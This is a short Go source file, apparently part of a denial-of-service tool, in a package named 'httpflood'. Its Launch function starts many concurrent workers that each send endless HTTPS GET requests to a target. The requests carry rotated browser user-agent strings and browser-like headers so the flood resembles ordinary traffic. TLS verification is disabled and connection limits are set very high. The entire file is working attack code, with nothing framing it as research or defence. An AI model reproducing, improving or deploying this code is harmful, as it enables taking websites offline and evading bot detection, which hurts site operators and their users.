package httpflood

import (
	"crypto/tls"
	"math/rand"
	"net/http"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func Launch(target string, workers int) {
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        10000,
		MaxConnsPerHost:     10000,
		MaxIdleConnsPerHost: 10000,
		DisableKeepAlives:   false,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   8 * time.Second,
	}

	for i := 0; i < workers; i++ {
		go func() {
			for {
				req, _ := http.NewRequest("GET", "https://"+target, nil)
				req.Header.Set("User-Agent", randomUA())
				req.Header.Set("Accept", "text/html,application/xhtml+xml")
				req.Header.Set("Accept-Language", "en-US,en;q=0.9")
				client.Do(req)
				time.Sleep(50 * time.Millisecond)
			}
		}()
	}
}
